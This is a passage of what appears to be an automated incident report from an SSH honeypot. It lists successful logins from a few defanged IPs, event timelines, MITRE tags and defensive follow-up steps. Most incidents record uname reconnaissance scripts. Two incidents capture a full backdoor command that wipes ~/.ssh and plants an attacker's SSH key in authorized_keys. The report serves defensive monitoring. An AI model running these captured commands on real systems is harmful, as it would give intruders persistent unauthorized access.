| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:49` | `cowrie.session.connect` |
| `2026-09-10 19:00:51` | `cowrie.client.version` |
| `2026-09-10 19:00:51` | `cowrie.client.kex` |
| `2026-09-10 19:00:57` | `cowrie.login.success` |
| `2026-09-10 19:00:59` | `cowrie.session.params` |
| `2026-09-10 19:00:59` | `cowrie.command.input` |
| `2026-09-10 19:01:00` | `cowrie.log.closed` |
| `2026-09-10 19:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30e2e7cb380a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:56` | `cowrie.session.connect` |
| `2026-09-10 19:00:57` | `cowrie.client.version` |
| `2026-09-10 19:00:57` | `cowrie.client.kex` |
| `2026-09-10 19:01:01` | `cowrie.login.success` |
| `2026-09-10 19:01:02` | `cowrie.session.params` |
| `2026-09-10 19:01:02` | `cowrie.command.input` |
| `2026-09-10 19:01:04` | `cowrie.log.closed` |
| `2026-09-10 19:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87853013adde

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:04` | `cowrie.session.connect` |
| `2026-09-10 19:01:05` | `cowrie.client.version` |
| `2026-09-10 19:01:05` | `cowrie.client.kex` |
| `2026-09-10 19:01:08` | `cowrie.login.success` |
| `2026-09-10 19:01:09` | `cowrie.session.params` |
| `2026-09-10 19:01:09` | `cowrie.command.input` |
| `2026-09-10 19:01:09` | `cowrie.log.closed` |
| `2026-09-10 19:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d98b7a3adfa

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:12` | `cowrie.session.connect` |
| `2026-09-10 19:01:13` | `cowrie.client.version` |
| `2026-09-10 19:01:13` | `cowrie.client.kex` |
| `2026-09-10 19:01:15` | `cowrie.login.success` |
| `2026-09-10 19:01:17` | `cowrie.session.params` |
| `2026-09-10 19:01:17` | `cowrie.command.input` |
| `2026-09-10 19:01:18` | `cowrie.log.closed` |
| `2026-09-10 19:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3833856d1d14

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:20` | `cowrie.session.connect` |
| `2026-09-10 19:01:20` | `cowrie.client.version` |
| `2026-09-10 19:01:20` | `cowrie.client.kex` |
| `2026-09-10 19:01:21` | `cowrie.login.success` |
| `2026-09-10 19:01:23` | `cowrie.session.params` |
| `2026-09-10 19:01:23` | `cowrie.command.input` |
| `2026-09-10 19:01:24` | `cowrie.log.closed` |
| `2026-09-10 19:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f6d2b2aba0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:27` | `cowrie.session.connect` |
| `2026-09-10 19:01:27` | `cowrie.client.version` |
| `2026-09-10 19:01:27` | `cowrie.client.kex` |
| `2026-09-10 19:01:29` | `cowrie.login.success` |
| `2026-09-10 19:01:30` | `cowrie.session.params` |
| `2026-09-10 19:01:30` | `cowrie.command.input` |
| `2026-09-10 19:01:31` | `cowrie.log.closed` |
| `2026-09-10 19:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a23b10f3075

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:34` | `cowrie.session.connect` |
| `2026-09-10 19:01:34` | `cowrie.client.version` |
| `2026-09-10 19:01:34` | `cowrie.client.kex` |
| `2026-09-10 19:01:37` | `cowrie.login.success` |
| `2026-09-10 19:01:39` | `cowrie.session.params` |
| `2026-09-10 19:01:39` | `cowrie.command.input` |
| `2026-09-10 19:01:40` | `cowrie.log.closed` |
| `2026-09-10 19:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e2d43d7940

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:41` | `cowrie.session.connect` |
| `2026-09-10 19:01:42` | `cowrie.client.version` |
| `2026-09-10 19:01:42` | `cowrie.client.kex` |
| `2026-09-10 19:01:44` | `cowrie.login.success` |
| `2026-09-10 19:01:45` | `cowrie.session.params` |
| `2026-09-10 19:01:45` | `cowrie.command.input` |
| `2026-09-10 19:01:46` | `cowrie.log.closed` |
| `2026-09-10 19:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-341343e2f88a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:48` | `cowrie.session.connect` |
| `2026-09-10 19:01:49` | `cowrie.client.version` |
| `2026-09-10 19:01:49` | `cowrie.client.kex` |
| `2026-09-10 19:01:50` | `cowrie.login.success` |
| `2026-09-10 19:01:51` | `cowrie.session.params` |
| `2026-09-10 19:01:51` | `cowrie.command.input` |
| `2026-09-10 19:01:52` | `cowrie.log.closed` |
| `2026-09-10 19:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9244ad180ce

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:52` | `cowrie.session.connect` |
| `2026-09-10 19:01:52` | `cowrie.client.version` |
| `2026-09-10 19:01:52` | `cowrie.client.kex` |
| `2026-09-10 19:01:54` | `cowrie.login.success` |
| `2026-09-10 19:01:55` | `cowrie.session.params` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.success` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.command.input` |
| `2026-09-10 19:01:55` | `cowrie.log.closed` |
| `2026-09-10 19:01:57` | `cowrie.session.params` |
| `2026-09-10 19:01:57` | `cowrie.command.input` |
| `2026-09-10 19:01:57` | `cowrie.log.closed` |
| `2026-09-10 19:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-847a8c7af872

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:01 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:01:56` | `cowrie.session.connect` |
| `2026-09-10 19:01:56` | `cowrie.client.version` |
| `2026-09-10 19:01:57` | `cowrie.client.kex` |
| `2026-09-10 19:01:58` | `cowrie.login.success` |
| `2026-09-10 19:01:59` | `cowrie.session.params` |
| `2026-09-10 19:01:59` | `cowrie.command.input` |
| `2026-09-10 19:01:59` | `cowrie.log.closed` |
| `2026-09-10 19:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a1b4d1ba8da

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:02 |
| **Last Seen** | 2026-09-10 19:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:02:03` | `cowrie.session.connect` |
| `2026-09-10 19:02:04` | `cowrie.client.version` |
| `2026-09-10 19:02:04` | `cowrie.client.kex` |
| `2026-09-10 19:02:05` | `cowrie.login.success` |
| `2026-09-10 19:02:07` | `cowrie.session.params` |
| `2026-09-10 19:02:07` | `cowrie.command.input` |
| `2026-09-10 19:02:07` | `cowrie.log.closed` |
| `2026-09-10 19:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cede10032f9c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:02 |
| **Last Seen** | 2026-09-10 19:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:02:11` | `cowrie.session.connect` |
| `2026-09-10 19:02:11` | `cowrie.client.version` |
| `2026-09-10 19:02:11` | `cowrie.client.kex` |
| `2026-09-10 19:02:12` | `cowrie.login.success` |
| `2026-09-10 19:02:13` | `cowrie.session.params` |
| `2026-09-10 19:02:13` | `cowrie.command.input` |
| `2026-09-10 19:02:14` | `cowrie.log.closed` |
| `2026-09-10 19:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a513e475f71d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:02 |
| **Last Seen** | 2026-09-10 19:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:02:17` | `cowrie.session.connect` |
| `2026-09-10 19:02:18` | `cowrie.client.version` |
| `2026-09-10 19:02:18` | `cowrie.client.kex` |
| `2026-09-10 19:02:21` | `cowrie.login.success` |
| `2026-09-10 19:02:25` | `cowrie.session.params` |
| `2026-09-10 19:02:25` | `cowrie.command.input` |
| `2026-09-10 19:02:27` | `cowrie.log.closed` |
| `2026-09-10 19:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde3ef0f7abb

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:02 |
| **Last Seen** | 2026-09-10 19:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:02:23` | `cowrie.session.connect` |
| `2026-09-10 19:02:25` | `cowrie.client.version` |
| `2026-09-10 19:02:25` | `cowrie.client.kex` |
| `2026-09-10 19:02:30` | `cowrie.login.success` |
| `2026-09-10 19:02:34` | `cowrie.session.params` |
| `2026-09-10 19:02:34` | `cowrie.command.input` |
| `2026-09-10 19:02:35` | `cowrie.log.closed` |
| `2026-09-10 19:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aca3c408503

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:02 |
| **Last Seen** | 2026-09-10 19:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:02:32` | `cowrie.session.connect` |
| `2026-09-10 19:02:33` | `cowrie.client.version` |
| `2026-09-10 19:02:33` | `cowrie.client.kex` |
| `2026-09-10 19:02:37` | `cowrie.login.success` |
| `2026-09-10 19:02:39` | `cowrie.session.params` |
| `2026-09-10 19:02:39` | `cowrie.command.input` |
| `2026-09-10 19:02:40` | `cowrie.log.closed` |
| `2026-09-10 19:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d350abb2e5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:02 |
| **Last Seen** | 2026-09-10 19:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:02:41` | `cowrie.session.connect` |
| `2026-09-10 19:02:41` | `cowrie.client.version` |
| `2026-09-10 19:02:41` | `cowrie.client.kex` |
| `2026-09-10 19:02:43` | `cowrie.login.success` |
| `2026-09-10 19:02:45` | `cowrie.session.params` |
| `2026-09-10 19:02:45` | `cowrie.command.input` |
| `2026-09-10 19:02:46` | `cowrie.log.closed` |
| `2026-09-10 19:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b34e5f10f564

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:03 |
| **Last Seen** | 2026-09-10 19:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:03:54` | `cowrie.session.connect` |
| `2026-09-10 19:03:54` | `cowrie.client.version` |
| `2026-09-10 19:03:54` | `cowrie.client.kex` |
| `2026-09-10 19:03:55` | `cowrie.login.success` |
| `2026-09-10 19:03:56` | `cowrie.session.params` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.success` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.command.input` |
| `2026-09-10 19:03:56` | `cowrie.log.closed` |
| `2026-09-10 19:03:57` | `cowrie.session.params` |
| `2026-09-10 19:03:57` | `cowrie.command.input` |
| `2026-09-10 19:03:58` | `cowrie.log.closed` |
| `2026-09-10 19:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63fb46464fd

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-09-10 19:04 |
| **Last Seen** | 2026-09-10 19:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:04:04` | `cowrie.session.connect` |
| `2026-09-10 19:04:04` | `cowrie.client.version` |
| `2026-09-10 19:04:04` | `cowrie.client.kex` |
| `2026-09-10 19:04:05` | `cowrie.login.success` |
| `2026-09-10 19:04:06` | `cowrie.session.params` |
| `2026-09-10 19:04:06` | `cowrie.command.input` |
| `2026-09-10 19:04:06` | `cowrie.command.failed` |
| `2026-09-10 19:04:06` | `cowrie.log.closed` |
| `2026-09-10 19:04:07` | `cowrie.session.params` |
| `2026-09-10 19:04:07` | `cowrie.command.input` |
| `2026-09-10 19:04:07` | `cowrie.session.file_download` |
| `2026-09-10 19:04:07` | `cowrie.log.closed` |
| `2026-09-10 19:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b219d1b2c2b

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-09-10 19:04 |
| **Last Seen** | 2026-09-10 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:04:08` | `cowrie.session.connect` |
| `2026-09-10 19:04:08` | `cowrie.client.version` |
| `2026-09-10 19:04:08` | `cowrie.client.kex` |
| `2026-09-10 19:04:09` | `cowrie.login.success` |
| `2026-09-10 19:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c001ca42f48d

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-09-10 19:04 |
| **Last Seen** | 2026-09-10 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:04:09` | `cowrie.session.connect` |
| `2026-09-10 19:04:09` | `cowrie.client.version` |
| `2026-09-10 19:04:09` | `cowrie.client.kex` |
| `2026-09-10 19:04:10` | `cowrie.login.success` |
| `2026-09-10 19:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-225de1da828f

| Field | Detail |
|---|---|
| **Source IP** | `103.200.23[.]107` |
| **First Seen** | 2026-09-10 19:04 |
| **Last Seen** | 2026-09-10 19:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:04:23` | `cowrie.session.connect` |
| `2026-09-10 19:04:23` | `cowrie.client.version` |
| `2026-09-10 19:04:23` | `cowrie.client.kex` |
| `2026-09-10 19:04:24` | `cowrie.login.success` |
| `2026-09-10 19:04:25` | `cowrie.session.params` |
| `2026-09-10 19:04:25` | `cowrie.command.input` |
